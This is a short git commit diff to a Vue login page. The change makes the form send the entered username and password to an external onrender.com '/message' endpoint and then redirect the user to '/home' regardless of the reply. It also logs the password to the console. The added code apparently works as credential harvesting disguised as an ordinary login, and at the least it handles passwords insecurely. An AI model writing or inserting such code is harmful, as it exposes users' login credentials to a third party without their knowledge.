1772cde606b4fec1952c4e59f99c55babe9fd6a2
david <davidneau49@gmail.com>
2025-12-15 23:44:12 +0100

    init

--- src/views/Login.vue
+++ src/views/Login.vue
@@ -25,7 +25,21 @@ export default {
         let login = document.getElementById("login").value
         let pwd = document.getElementById("pwd").value
         console.log("login :", login, "pwd :", pwd)
-        this.$router.push('/')
+        fetch('https://pokemon-1xp8.onrender.com/message', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: {"login": login, "pwd": pwd}
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            console.log('Réponse serveur:', data)
+        })
+        .catch(err => console.error(err))
+        this.$router.push('/home')
     }
   }
 }
